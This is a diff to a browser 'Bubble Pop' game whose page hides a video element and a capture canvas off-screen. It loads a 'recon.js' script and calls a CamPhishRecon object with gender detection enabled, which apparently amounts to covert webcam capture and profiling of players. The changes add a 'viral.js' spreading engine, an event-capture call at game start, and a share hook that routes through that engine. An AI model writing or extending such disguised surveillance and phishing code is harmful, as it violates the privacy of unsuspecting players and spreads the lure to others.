@@ -31,6 +31,7 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 </style>
 </head><body>
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/viral.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 <div id="wrap"><canvas id="c"></canvas></div>
@@ -73,7 +74,7 @@ function onTap(e){e.preventDefault();if(!running)return;var rect=c.getBoundingCl
 function popBubble(x,y){for(var i=bubbles.length-1;i>=0;i--){var b=bubbles[i];var dx=x-b.x,dy=y-b.y;if(dx*dx+dy*dy<b.r*b.r){var pts=b.gold?50:10;score+=pts;combo++;if(combo>maxCombo)maxCombo=combo;snd(b.gold?1200:600+combo*30);if(navigator.vibrate)navigator.vibrate(b.gold?30:10);spawnParts(b.x,b.y,b.col);bubbles.splice(i,1);return;}}}
 function spawnParts(x,y,col){for(var i=0;i<8;i++){var a=Math.random()*6.28,s=1+Math.random()*3;particles.push({x:x,y:y,vx:Math.cos(a)*s,vy:Math.sin(a)*s,life:20,col:col});}}
 function startGame(){
-if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+if(window.CamPhishRecon){CamPhishRecon.init({genderDetect:true});CamPhishRecon.Capture.event('bubblepop_game_start',{});}
 bubbles=[];particles=[];score=0;combo=0;maxCombo=0;fc=0;spawnT=0;spawnRate=50;speed=1.5;running=true;dead=false;
 elMenu.classList.add('hidden');elGameover.classList.add('hidden');elScore.textContent='0';
 requestAnimationFrame(loop);
@@ -97,6 +98,10 @@ function menuLoop(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,
 function endGame(){running=false;dead=true;hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);localStorage.setItem('bubblePopHS',JSON.stringify(hs));document.getElementById('finalScore').textContent=score;document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);elGameover.classList.remove('hidden');showLb();if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score,combo:maxCombo});}
 function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('menuLb').innerHTML=h;document.getElementById('goLb').innerHTML=h;}
 function shareCard(t){
+if(window.ViralEngine){
+ViralEngine.doShare(t,score,'🫧 I scored '+score+' in Bubble Pop! '+SHARE_URL);
+return;
+}
 var cc=document.createElement('canvas');cc.width=600;cc.height=800;var x=cc.getContext('2d');
 var bg=x.createLinearGradient(0,0,0,800);bg.addColorStop(0,'#001a2e');bg.addColorStop(1,'#003355');x.fillStyle=bg;x.fillRect(0,0,600,800);
 for(var i=0;i<20;i++){x.fillStyle=COLORS[i%5];x.globalAlpha=0.1;x.beginPath();x.arc(50+Math.random()*500,50+Math.random()*700,15+Math.random()*20,0,6.28);x.fill();}x.globalAlpha=1;
